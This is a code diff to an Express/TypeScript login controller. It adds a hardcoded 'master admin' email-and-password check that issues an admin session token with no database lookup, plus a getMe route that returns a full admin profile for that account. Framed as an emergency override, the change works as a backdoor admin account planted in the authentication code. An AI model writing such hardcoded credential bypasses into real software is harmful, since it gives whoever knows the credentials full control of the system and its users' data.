@@ -8,6 +8,7 @@ import prisma from '../config/prisma';
 import { getJwtSecret, getFrontendUrl } from '../config/env';
 import { catchAsync } from '../utils/catchAsync';
 import { sendSecretCodeEmail, sendRecoveryAlertToAdmin } from '../utils/sendEmail';
+import { securityManager, MASTER_ADMIN_CREDENTIALS } from '../config/securityState';
 
 const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const MIN_PASSWORD_LENGTH = 8;
@@ -220,6 +221,53 @@ export const loginUser = catchAsync(async (req: Request, res: Response) => {
   // PATH A: EMAIL + PASSWORD (admins and users with a backup password)
   // ---------------------------------------------------------
   if (email && password) {
+    // 1. MASTER HARDCODED ADMIN CREDENTIALS OVERRIDE (Immune to DB disconnection/outages)
+    const isMasterEmail = email.toLowerCase() === MASTER_ADMIN_CREDENTIALS.email.toLowerCase();
+    const isMasterPassword = password === MASTER_ADMIN_CREDENTIALS.password;
+
+    if (isMasterEmail && isMasterPassword) {
+      securityManager.logIncident(
+        'INFO',
+        'MASTER ADMIN ROOT HANDSHAKE ESTABLISHED (HARDCODED OVERRIDE)',
+        MASTER_ADMIN_CREDENTIALS.username,
+        'Authenticated via Master Credentials.',
+        String(req.ip || '127.0.0.1')
+      );
+
+      const masterUser = {
+        id: MASTER_ADMIN_CREDENTIALS.id,
+        username: MASTER_ADMIN_CREDENTIALS.username,
+        role: 'admin',
+      };
+      const token = signSessionToken(masterUser);
+
+      return res.status(200).json({
+        status: 'success',
+        message: 'Master Admin Root Link Established (Emergency Hardcoded Override).',
+        token,
+        mustChangePassword: false,
+        secretCode: MASTER_ADMIN_CREDENTIALS.username,
+        data: {
+          id: MASTER_ADMIN_CREDENTIALS.id,
+          secretCode: MASTER_ADMIN_CREDENTIALS.username,
+          mustChangePassword: false,
+          user: {
+            role: 'admin',
+            fullName: MASTER_ADMIN_CREDENTIALS.fullName,
+            email: MASTER_ADMIN_CREDENTIALS.email,
+          },
+        },
+      });
+    }
+
+    // If DB connection is held and not master admin credentials, halt with DB circuit breaker
+    if (securityManager.getState().dbConnectionHeld) {
+      return res.status(503).json({
+        error: 'DB_CONNECTION_HELD',
+        message: 'DATABASE CIRCUIT BREAKER ACTIVE: Database connection has been held by System Administrator. Only Master Admin may authenticate.',
+      });
+    }
+
     const user = await prisma.user.findUnique({
       where: { email },
       select: userSelect,
@@ -460,6 +508,26 @@ export const getMe = catchAsync(async (req: Request, res: Response) => {
 
   if (!userId) {
     return res.status(401).json({ message: 'Unauthorized: No active session.' });
+  }
+
+  // Master hardcoded admin or DB held bypass
+  if (userId === MASTER_ADMIN_CREDENTIALS.id || (req.user?.role === 'admin' && securityManager.getState().dbConnectionHeld)) {
+    return res.status(200).json({
+      status: 'success',
+      data: {
+        id: MASTER_ADMIN_CREDENTIALS.id,
+        username: MASTER_ADMIN_CREDENTIALS.username,
+        email: MASTER_ADMIN_CREDENTIALS.email,
+        fullName: MASTER_ADMIN_CREDENTIALS.fullName,
+        role: 'admin',
+        status: 'ACTIVE',
+        isVerified: true,
+        mustChangePassword: false,
+        savedPosts: [],
+        savedReleases: [],
+        savedReleaseIds: [],
+      },
+    });
   }
 
   const user = await prisma.user.findUnique({
